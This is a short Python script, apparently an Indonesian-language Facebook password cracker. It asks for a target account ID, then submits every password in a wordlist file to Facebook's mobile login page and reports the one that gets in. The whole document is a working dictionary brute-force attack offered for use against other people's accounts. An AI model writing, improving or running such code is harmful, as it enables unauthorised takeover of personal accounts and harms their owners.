import requests
import sys, os


id = raw_input("ID TARGET : ")

url = "https://free.facebook.com/login.php"


ex = open('list.txt', 'r').readlines()


for line in ex:
    password = line.strip()
    http = requests.post(url, data={'email':id, 'pass':password, 'login':'submit'})
    content = http.content
    if "Beranda" in content:
        os.system("clear")
        print "[+] PASSWORD FOUND => [",password,"]", "[FOUND]"
        sys.exit(1)
    else:
        print "[!] PASSWORD SALAH => ",password, "[NOTFOUND]"
